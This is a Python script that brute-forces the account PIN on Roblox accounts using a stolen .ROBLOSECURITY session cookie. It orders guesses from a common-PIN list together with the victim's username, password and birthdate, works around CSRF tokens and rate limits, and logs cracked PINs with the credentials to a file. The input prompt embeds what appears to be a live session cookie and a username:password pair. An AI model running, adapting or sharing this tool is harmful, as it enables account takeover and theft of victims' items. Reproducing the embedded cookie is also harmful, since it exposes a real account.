import os, time, requests
from threading import Thread
from datetime import datetime

credentials = input('BenNerd7:NerdGamer:_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_4BF56B010B863FEA603BDABA0224DE30FFF8D3ED377FC168F3548D8BF916220CAA75A73E64FCD968A873BDB482A9844A60D3AAA30AA4FAF0AB2779250D5F757F7C23D6E4E9B55BAF48529B5D90BB3A2C8DA0EEAEAD3B66A719BDC11C606AA4C15FF1CF551D02728DDF3BF2B7C5C6EC0740C812A3F5D5FF18E973A327D15672234F04EBD29961D644ECA0229272DA762B14BA5B227799C6DED564EE071F3BF4A05E2F00C52491855E5374CA0C937E85CF7B7EE940D2D8DFE935B404051AF492C54EF33757B008A3C339F0D878FBE6C15F41CD70CD26256F7668E33327B5B5301C800757F94248663CC7157710F770ADCBFF13AD338C724CB6D6122FC3099EB47CDC280EBA4059B031587B540C09802DCED75747E0863D412CAD2A6475B22DC3CB252273008C09E8F0794371CCA6C8E7A675FBB867BB642EB389F0F907EEDFA44C49B0878DF83637DE2656D7A2D0DEBEA5B9102A35CD944E7B3BEFEC7B5CD37AA4A2667757000A522A248913C4E0BB562945E1F706
                  ~ ')
if credentials.count(':') >= 2:
    username, password, cookie = credentials.split(':',2)
else:
    username, password, cookie = '', '', credentials
os.system('cls')

req = requests.Session()
req.cookies['.ROBLOSECURITY'] = cookie
try:
    username = req.get('https://www.roblox.com/mobileapi/userinfo').json()['UserName']
    print('Logged in to', username)
except:
    input('INVALID COOKIE')
    exit()

common_pins = req.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv').text
pins = [pin.split(',')[0] for pin in common_pins.splitlines()]
print('Loaded pins by commonality.')

r = req.get('https://accountinformation.roblox.com/v1/birthdate').json()
month = str(r['birthMonth']).zfill(2)
day = str(r['birthDay']).zfill(2)
year = str(r['birthYear'])

likely = [username[:4], password[:4], username[:2]*2, password[:2]*2, username[-4:], password[-4:], username[-2:]*2, password[-2:]*2, year, day+day, month+month, month+day, day+month]
likely = [x for x in likely if x.isdigit() and len(x) == 4]
for pin in likely:
    pins.remove(pin)
    pins.insert(0, pin)
print(f'Prioritized likely pins {likely}\n')

tried = 0
while 1:
    pin = pins.pop(0)
    os.system(f'title Pin Cracking {username} ~ Tried: {tried} ~ Current pin: {pin}')
    try:
        r = req.post('https://auth.roblox.com/v1/account/pin/unlock', json={'pin': pin})
        if 'X-CSRF-TOKEN' in r.headers:
            pins.insert(0, pin)
            req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
        elif 'errors' in r.json():
            code = r.json()['errors'][0]['code']
            if code == 0 and r.json()['errors'][0]['message'] == 'Authorization has been denied for this request.':
                print(f'[FAILURE] Account cookie expired.')
                break
            elif code == 1:
                print(f'[SUCCESS] NO PIN')
                with open('pins.txt','a') as f:
                    f.write(f'NO PIN:{credentials}\n')
                break
            elif code == 3 or '"message":"TooManyRequests"' in r.text:
                pins.insert(0, pin)
                print(f'[{datetime.now()}] Sleeping for 5 minutes.')
                time.sleep(60*5)
            elif code == 4:
                tried += 1
        elif 'unlockedUntil' in r.json():
            print(f'[SUCCESS] {pin}')
            with open('pins.txt','a') as f:
                f.write(f'{pin}:{credentials}\n')
            break
        else:
            pins.insert(0, pin)
            print(f'[ERROR] {r.text}')
    except Exception as e:
        print(f'[ERROR] {e}')
        pins.insert(0, pin)

input()
